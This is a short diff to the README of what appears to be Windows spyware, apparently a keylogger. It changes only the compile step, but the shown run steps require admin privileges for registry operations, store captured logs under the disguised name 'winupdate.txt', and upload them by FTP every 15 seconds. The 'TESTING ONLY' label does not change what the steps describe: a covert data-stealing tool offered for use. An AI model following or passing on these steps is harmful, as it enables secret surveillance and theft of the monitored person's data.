@@ -67,7 +67,7 @@ Compile with:
 ==================================================
 🚀 HOW TO RUN (TESTING ONLY)
 ==================================================
-1. Compile the source using Visual Studio or MinGW with required libraries.
+1. Compile the source using Visual Studio or MinGW with required libraries (recommended: Codeblock).
 2. Run the binary (ensure admin privileges for registry operations).
 3. Logs will be stored in the user Documents folder as `winupdate.txt`.
 4. The log will be uploaded via FTP every 15 seconds (if online).
